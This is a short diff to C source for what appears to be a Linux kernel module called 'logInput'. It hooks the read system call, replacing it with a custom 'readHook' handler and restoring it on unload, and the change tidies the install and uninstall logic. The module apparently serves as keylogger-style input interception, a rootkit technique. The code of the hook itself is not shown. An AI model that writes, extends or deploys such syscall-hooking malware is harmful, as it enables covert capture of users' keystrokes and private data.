@@ -47,15 +47,18 @@ asmlinkage int readHook(int fd, void* buf, size_t nbytes) {
 } 
 
 
-int __init logInput_init(void) {	
-	originalRead = hookSyscall(__NR_read, readHook);
-	printk(KERN_INFO "original read is at %p\n", originalRead);
+int logInput_init(void) {
+	if (originalRead == NULL) {
+		originalRead = hookSyscall(__NR_read, readHook);
+		printInfo("original read is at %p\n", originalRead);
+	}
 	return 0;
 }
 
-void __exit logInput_exit(void) {
+void logInput_exit(void) {
 	if (originalRead != NULL) {
-		printk(KERN_INFO "restoring original read call to %p\n", originalRead);
+		printInfo("restoring original read call to %p\n", originalRead);
 		hookSyscall(__NR_read, originalRead);
+		originalRead = NULL;
 	}
 }
